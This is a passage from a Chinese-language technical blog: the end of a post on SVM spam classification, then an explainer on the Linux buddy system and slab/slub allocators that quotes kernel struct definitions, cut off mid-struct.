<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 4.测试垃圾邮件分类 =====================</span></span><br><span class="line"></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data/spamTest.mat&#x27;</span>)</span><br><span class="line">Xtest = data[<span class="string">&#x27;Xtest&#x27;</span>]</span><br><span class="line">ytest = data[<span class="string">&#x27;ytest&#x27;</span>].flatten()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Evaluating the trained linear SVM on a test set ...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = clf.predict(Xtest) <span class="comment"># 预测SVM的结果</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Test Accuracy: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.mean(p == ytest) * <span class="number">100</span>))</span><br></pre></td></tr></table></figure>
<h2 id="Top-Predictors-for-Spam（垃圾邮件的主要预测指标）"><a href="#Top-Predictors-for-Spam（垃圾邮件的主要预测指标）" class="headerlink" title="Top Predictors for Spam（垃圾邮件的主要预测指标）"></a>Top Predictors for Spam（垃圾邮件的主要预测指标）</h2><p>为了更好地理解垃圾邮件分类器的工作原理，我们可以检查参数以查看分类器认为哪些词最能预测垃圾邮件</p>
<ul>
<li>ex6_spam.m 的下一步是在分类器中找到具有最大正值的参数（最高频）并显示相应的单词</li>
<li>因此，如果一封电子邮件包含诸如“保证”、“删除”、“美元”和“价格”之类的词（垃圾邮件的高频词汇），它很可能被归类为垃圾邮件</li>
</ul>
<p>由于我们正在训练的模型是线性 SVM，我们可以检查模型学习的 w 权重，以更好地了解它如何确定电子邮件是否为垃圾邮件，以下代码查找分类器中权重最高的单词，非正式地，分类器“认为”这些词最有可能是垃圾邮件的指标</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 5.垃圾邮件的主要预测指标 =====================</span></span><br><span class="line"></span><br><span class="line">vocab_list = pe.get_vocab_list() <span class="comment"># 导入词汇表</span></span><br><span class="line">indices = np.argsort(clf.coef_).flatten()[::-<span class="number">1</span>] <span class="comment"># &quot;-1&quot;代表倒置,顺序改为从大到小了</span></span><br><span class="line"><span class="built_in">print</span>(indices)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; (&#123;:0.6f&#125;)&#x27;</span>.<span class="built_in">format</span>(vocab_list[indices[i]], clf.coef_.flatten()[indices[i]]))</span><br></pre></td></tr></table></figure>
<ul>
<li>argsort(arr)：返回的是元素值从小到大排序后的索引值的数组</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653370935191.png" class width="1653370935191"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/23/BuddySystem&Slab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/23/BuddySystem&Slab/" class="post-title-link" itemprop="url">BuddySystem&Slub</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-23 23:39:41" itemprop="dateCreated datePublished" datetime="2022-05-23T23:39:41+08:00">2022-05-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-22 13:26:28" itemprop="dateModified" datetime="2022-06-22T13:26:28+08:00">2022-06-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="伙伴系统"><a href="#伙伴系统" class="headerlink" title="伙伴系统"></a>伙伴系统</h2><p><strong>伙伴关系</strong></p>
<p>伙伴关系的定义为：由一个母实体分成的两个各方面属性一致的两个子实体，这两个子实体就处于伙伴关系</p>
<ul>
<li>在操作系统分配内存的过程中，一个内存块经常被分成两个大小相等的内存块，这两个大小相等的内存块就处于伙伴关系</li>
<li>它满足3个条件：<ul>
<li>两个块具有相同大小</li>
<li>物理地址是连续的</li>
<li>从同一个大块中拆分出来</li>
</ul>
</li>
</ul>
<p><strong>伙伴系统</strong></p>
<p>伙伴系统（buddy system）是内核中用来管理物理内存的一种算法，Linux2.6 为每个管理区使用不同的伙伴系统，内核空间分为三种区，DMA，NORMAL，HIGHMEM，对于每一种区，都有对应的伙伴算法</p>
<ul>
<li>我们知道内存中有一些是被内核代码占用，还有一些是被特殊用途所保留，那么剩余的空闲内存都会交给内核内存管理系统来进行统一管理和分配</li>
<li>内核中会把内存按照页来组织分配，随着进程的对内存的申请和释放，系统的内存会不断的区域碎片化</li>
<li>到最后会发现，明明系统还有很多空闲内存，却无法分配出一块连续的内存，这对于系统来说并不是好事</li>
</ul>
<p>伙伴系统（buddy system）把系统中要管理的物理内存按照页面个数分为了 11 个组，分别对应11种大小不同的连续内存块，每组中的内存块大小都相等，且必须是 2 的 n 次幂 (Pow(2, n))，即 1, 2, 4, 8, 16, 32, 64, 128 … 1024 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include\linux\mmzone.h */</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ORDER 11</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>	<span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span> <span class="comment">/* 不同大小的空闲区域 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span> <span class="comment">/* 内存块链表连接时只需把内存块的第一个页关联即可(都是连续的) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		nr_free; <span class="comment">/* 表示这种内存块(包括所有迁移类型)的数量 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>那么系统中就存在 2^0~2^10 这么11种大小不同的内存块，对应内存块大小为 4KB ~ 4M 内核用 11 个链表来管理 11 种大小不同的内存块</li>
</ul>
<p>伙伴分配器的数据结构在逻辑上的表示就像是一个完全二叉树，大概像这样： </p>
<img src="/2022/05/23/BuddySystem&Slab/1653288150250-1653726952169-1655875583491.png" class width="1653288150250">  
<ul>
<li>当然实际编码过程中并不会使用一个 struct TreeNode 的形式去把二叉树的各个节点用指针连起来，因为是这个树一定是完全二叉树，所以可以使用一个数组来表示树的结构</li>
<li>用这一个数组，就可以表示所有节点的位置信息</li>
</ul>
<p>当一个页面被等分时，它自己也就不存在了：</p>
<img src="/2022/05/23/BuddySystem&Slab/1653445033299-1655875583491.png" class width="1653445033299"> 
<p><strong>位图管理</strong></p>
<p>为了便于页面的维护，将多个页面组成内存块，每个内存块都有 “2的方幂” 个页，方幂的指数被称为阶</p>
<p>在操作内存时，经常将这些内存块分成大小相等的两个块，分成的两个内存块被称为伙伴块，采用 “一位二进制数” 来表示它们的伙伴关系</p>
<p>系统根据该位为 “0” 或位为 “1” 来决定是否使用或者分配该页面块，系统每次分配和回收伙伴块时都要对它们的伙伴位跟 “1” 进行异或运算</p>
<ul>
<li>刚开始时，父块还没有等分，所以伙伴块不存在（也可以认为是：两个伙伴块都空闲），它们的伙伴位为 “0”</li>
<li>如果需要等分，则把第一块插入下一级，第二块分配出去，异或后得 “1”（只使用了一个块）</li>
<li>如果另一块也被使用，异或后得 “0”（两个块都使用了）</li>
<li>如果前面一块回收了异或后得 “1”</li>
<li>如果另一块也回收了异或后得 “0”</li>
</ul>
<p>整理一下便是：</p>
<ul>
<li>当这个位为 “1”，表示其中一块在使用</li>
<li>当这个位为 “0”，表示两个页面块都在使用（一个完整的块不会分为两个空块）</li>
</ul>
<p>注意：这个 “一位二进制数” 存储在 “位图 map” 中</p>
<p><strong>空闲内存块管理</strong></p>
<p>下图可以展示 free_area 的整体结构：</p>
<img src="/2022/05/23/BuddySystem&Slab/1653288462902-1653726952170-1655875583491.png" class width="1653288462902">  
<img src="/2022/05/23/BuddySystem&Slab/1653447102092-1655875583491.png" class width="1653447102092"> 
<ul>
<li>free_area 就是一个数组，存放有许多 free_list</li>
<li>每个 free_list（free_area[x]）都有一个 map 位图（用于表示各个伙伴块的关系）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>下图就是一个 free_list（free_area[x]）的结构：</p>
<img src="/2022/05/23/BuddySystem&Slab/1653288764042-1653726952170-1655875583491.png" class width="1653288764042"> 
<img src="/2022/05/23/BuddySystem&Slab/1653447624502-1655875583492.png" class width="1653447624502"> 
<ul>
<li>free_list（free_area[x]）用于链接 “2的n次方” 组成的内存块</li>
<li>map 中的一个“二进制位”表示两个伙伴块的关系</li>
</ul>
<p><strong>重要结构体</strong></p>
<ul>
<li>页（page）：一个 page 结构表示一个物理内存页面</li>
<li>区（zone）：因为硬件限制，Linux 内核不能把所有的物理内存页统一对待，把属性相同的物理内存页面归结到了一个区中</li>
<li>节点（pglist_data）：pglist_data 结构中包含了 zonelist 数组，第一个 zonelist 类型的元素指向本节点内的 zone 数组，第二个 zonelist 类型的元素指向其它节点的 zone 数组，而一个 zone 结构中的 free_area 数组中又挂载着 page 结构</li>
</ul>
<img src="/2022/05/23/BuddySystem&Slab/1653305919635-1653726952170-1655875583492.png" class width="1653305919635"> 
<p><strong>伙伴算法-分配流程</strong></p>
<p>我先从 free_area 的角度继续分析，假如系统需要 4(2x2) 个页面大小的内存块：</p>
<ul>
<li>该算法首先到 free_area[2] 中查找：<ul>
<li>如果链表中有空闲块：就直接从中摘下并分配出去</li>
<li>如果没有：算法将顺着数组向上查找 free_area[3]<ul>
<li>如果 free_area[3] 中有空闲块：则将其从链表中摘下，分成等大小的两部分，前 4 个页面作为一个块插入 free_area[2] 的链表头部，后 4 个页面分配出去</li>
<li>如果 free_area[3] 中也没有：就再向上查找 free_area[4]<ul>
<li>如果 free_area[4] 中有：就将这 16(2x2x2x2) 个页面等分成两份，前一半的 8 个页挂 free_area[3] 的链表头部，后一半的 8 个页再次等分为 2 个 4 页，前一半挂 free_area[2] 的链表中，后一半分配出去</li>
<li>假如 free_area[4] 也没有：则重复上面的过程，知道到达 free_area 数组的最后，如果还没有则放弃分配</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>free_area 中只存放空闲块，从空闲块的视角来看的话：<ul>
<li>从小到大进行查找，优先分配小块</li>
<li>如果没有小块，就等分大块，前半部分插入下一级链表头部，后半部分进行分配</li>
<li>如果后半部分仍然可以等分，就重复进行“等分插链”的操作</li>
</ul>
</li>
</ul>
<p><strong>伙伴算法-释放流程</strong></p>
<p>内存的释放是分配的逆过程，也可以看作是伙伴的合并过程</p>
<ul>
<li>当释放一个块时，先在其对应的链表中考查是否有伙伴存在<ul>
<li>如果没有伙伴块：就直接把要释放的块挂入链表头</li>
<li>如果有：则从链表中摘下伙伴，合并成一个大块，然后继续考察合并后的块在更大一级链表中是否有伙伴存在，直到不能合并或者已经合并到了最大的块</li>
</ul>
</li>
</ul>
<p>PS：整个过程中，位图扮演了重要的角色，位图的某一位对应两个互为伙伴的块</p>
<ul>
<li>为“1”表示其中一块已经分配出去了，为“0”表示两块都都分配出去了</li>
<li>伙伴中无论是分配还是释放都只是相对的位图进行异或操作，释放过程根据位图判断伙伴是否存在<ul>
<li>如果对相应位的异或操作得“1”（原本是“0”），代表没有伙伴可以合并</li>
<li>如果异或操作得“0”（原本是“1”），代表伙伴块中的另一个已经空闲，可以进行合并</li>
<li>并且继续按这种方式合并伙伴，直到不能合并为止</li>
</ul>
</li>
</ul>
<h2 id="Slab分配器"><a href="#Slab分配器" class="headerlink" title="Slab分配器"></a>Slab分配器</h2><p><strong>slab的出现</strong></p>
<p>我们知道内核中的物理内存由伙伴系统（buddy system）进行管理，它的分配粒度是以物理页帧（page）为单位的，但内核中有大量的数据结构只需要若干 bytes 的空间，倘若仍按页来分配，势必会造成大量的内存被浪费掉</p>
<p>slab 分配器的出现（而 slub 是 slab 的衍生产物），就是为了解决内核中这些小块内存分配与管理的难题</p>
<p>slab 分配器，把常用的数据结构都看成一个个对象</p>
<ul>
<li>我们知道 buddy 分配器的分配单元是以页为单位的，然后将不同 order 的空闲物理页帧串成若干链表，分配时从对应链表里取出</li>
<li>而 slab 分配器则是以目标数据结构为单分配单元，且会将目标数据结构提前分配并串成链表，分配时从中取用</li>
</ul>
<p>从 2.6 内核开始对 slab 分配器的实现添加了两个备选方案 slub 和 slob（用 slub 比较多）</p>
<ul>
<li>slub 就是在之前 slab 上优化后的一个产物，去除了许多臃肿的实现，逐渐会完全替代老的 slab</li>
<li>而 slob 则是一个很轻量级的 slab 实现，代码量不大，官方说适合一些嵌入式设备</li>
</ul>
<img src="/2022/05/23/BuddySystem&Slab/1653316705399-1653726952170-1655875583492.png" class width="1653316705399">  
<p><strong>重要结构体</strong></p>
<p>这里有个复杂且重要的结构体：struct kmem_cache，即 <strong>缓存描述符</strong>（缓存器），准确的来说它并不包含实际的缓存空间，而是包含了一些缓存的管理数据，和指向实际缓存空间的指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* \linux-4.19.26\include\linux\slab_def.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> __<span class="title">percpu</span> *<span class="title">cpu_cache</span>;</span> <span class="comment">/* 本地高速缓存,每CPU结构对象释放时,优先放入这个本地CPU高速缓存中 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 1) Cache tunables. Protected by slab_mutex */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> batchcount; </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> limit; <span class="comment">/* 本地高速缓存中entry数组中空闲obj的最大数目 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> shared; <span class="comment">/* CPU共享高速缓存标志,实际地址保存在kmem_cache_node结构中 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">/* 对象长度+填充字节 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_buffer_size</span>;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 2) touched by every alloc &amp; free from the backend */</span></span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags; <span class="comment">/* 属性的flag标志,如果SLAB管理结构放在外部,则CFLAGS_OFF_SLAB置&#x27;1&#x27; */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num; <span class="comment">/* 每个slab中obj数量 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 3) cache_grow/shrink */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> gfporder; <span class="comment">/* 每个slab页块的阶(一个slab由2^gfporder个页构) */</span></span><br><span class="line">	<span class="keyword">gfp_t</span> allocflags; <span class="comment">/* 从伙伴系统分配页,补足slab时,页分配的gfp码 */</span></span><br><span class="line">	<span class="keyword">size_t</span> colour; <span class="comment">/* 缓存着色范围 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> colour_off; <span class="comment">/* 一个cache colour的长度(和一个cache line的大小相同) */</span></span><br><span class="line">    </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">freelist_cache</span>;</span> <span class="comment">/* 空闲对象链表放在slab外部时使用,管理用于slab对象管理结构中freelist成员的缓存,也就是又一个新缓存 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> freelist_size; <span class="comment">/* 空闲对象链表的大小 */</span></span><br><span class="line">	<span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *obj); <span class="comment">/* 创建高速缓存时的构造函数指针,一半为null */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 4) cache creation/removal */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">/* slab缓存名字 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span> <span class="comment">/* slab缓存描述符双向链表指针 */</span></span><br><span class="line">	<span class="keyword">int</span> refcount;</span><br><span class="line">	<span class="keyword">int</span> object_size; <span class="comment">/* slab中每个obj的大小 */</span></span><br><span class="line">	<span class="keyword">int</span> align; <span class="comment">/* obj对齐字节 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_SLAB</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> num_active;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> num_allocations;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> high_mark;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> grown;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> reaped;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> errors;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> max_freeable;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> node_allocs;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> node_frees;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> node_overflow;</span><br><span class="line">	<span class="keyword">atomic_t</span> allochit;</span><br><span class="line">	<span class="keyword">atomic_t</span> allocmiss;</span><br><span class="line">	<span class="keyword">atomic_t</span> freehit;</span><br><span class="line">	<span class="keyword">atomic_t</span> freemiss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_SLAB_LEAK</span></span><br><span class="line">	<span class="keyword">atomic_t</span> store_user_clean;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span> obj_offset;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_DEBUG_SLAB */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span> <span class="comment">/* slab节点链表组,对于NUMA系统中每个节点都会有一个struct kmem_cache_node数据结构 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>slab cache 中所有 slab 的大小一致，由一个或多个连续页组成（通常为一个page，伙伴系统提供）</li>
<li>每个 slab 中的 obj 大小和数量也是相同的</li>
</ul>
<p>slab cache 描述符 struct kmem_cache 中除了相关的管理数据外，有两个很重要的成员： </p>
<ul>
<li>struct array_cache __percpu *cpu_cache：<ul>
<li>cpu_cache 是一个 Per-CPU 数据结构，每个 CPU 独享（相当于函数和它局部变量的关系），用来表示本地 CPU 的 slab cache 对象缓冲池（注意是 slab cache obj 缓冲池不是 slab cache slab 缓冲池）</li>
<li>CPU 都有自己的硬件高速缓存，当前 CPU 上释放对象时，这个对象很可能还在 CPU 的硬件高速缓存中，这时使用这个对象的代价是非常小的，不需要重新装载到硬件高速缓存中，离 CPU 又最近，同时还可以减少锁的竞争，尤其是在多个 CPU 同时申请同样 size 或者同个缓存对象时，无需加锁即可操作</li>
<li>array_cache中 的 entry 空数组，就是用于保存本地 cpu 刚释放的 obj，所以该数组初始化时为空，只有本地 cpu 释放 slab cache 的 obj 后才会将此 obj 装入到 entry 数组 array_cache 的 entry 成员数组中保存的 obj 数量是由成员 limit 控制的，超过该限制后会将 entry 数组中的 batchcount 个 obj 迁移到对应节点 cpu 共享的空闲对象链表中</li>
<li>entry 数组的访问机制是 LIFO（last in fist out），此种设计非常巧妙，能保证本地 cpu 最近释放该 slab cache 的 obj 立马被下一个 slab 内存申请者获取到（有很大概率此 obj 仍然在本地 cpu 的硬件高速缓存中）</li>
</ul>
</li>
<li>struct kmem_cache_node *node[MAX_NUMNODES]：<ul>
<li>slab 缓存会为不同的节点维护一个自己的 slab 链表，用来缓存和管理自己节点的 slab obj，这通过 kmem_cache 中 node 数组成员来实现，node 数组中的每个数组项都为其对应的节点分配了一个 struct kmem_cache_node 结构</li>
<li>struct kmem_cache_node 结构定义的变量是一个每 node 变量，相比于 struct array_cache 定义的每 cpu 变量，kmem_cache_node 管理的内存区域粒度更大，因为kmem_cache_node 维护的对象是 slab，而 array_cache 维护的对象是 slab 中的 obj（一个 kmem_cache 可能包含一个或多个 slab，而一个 slab 中可能包含一个或多个 slab obj）</li>
<li>通过下面 struct kmem_cache_node 结构的代码实现我们来分析该结构体如何实现对本地节点指定 slab cache 中所有的 slab 进行管理的</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span>	<span class="comment">/* 该链表中存储的所有slab中只有部分obj是空闲的 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span> <span class="comment">/* 该链表中存储的所有slab中不存在空闲的obj */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span> <span class="comment">/* 该链表中存储的所有slab中每个obj都是空闲的 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> total_slabs; <span class="comment">/* 该节点中此kmem_cache的slab总数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> free_slabs; <span class="comment">/* 该节点中此kmem_cache空闲slab总数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> free_objects; <span class="comment">/* 该节点中此kmem_cache空闲obj总数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> free_limit; <span class="comment">/* 该节点中此kmem_cache中空闲obj数量的上限,多了就会回收到伙伴系统的空闲链表中 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> colour_next; <span class="comment">/* Per-node cache coloring */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span>	<span class="comment">/* 该节点上所有cpu共享的本地高速缓存 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span>	<span class="comment">/* 其他节点上所有cpu共享的本地高速缓存 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> next_reap; <span class="comment">/* updated without locking */</span></span><br><span class="line">	<span class="keyword">int</span> free_touched; <span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> nr_partial;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span 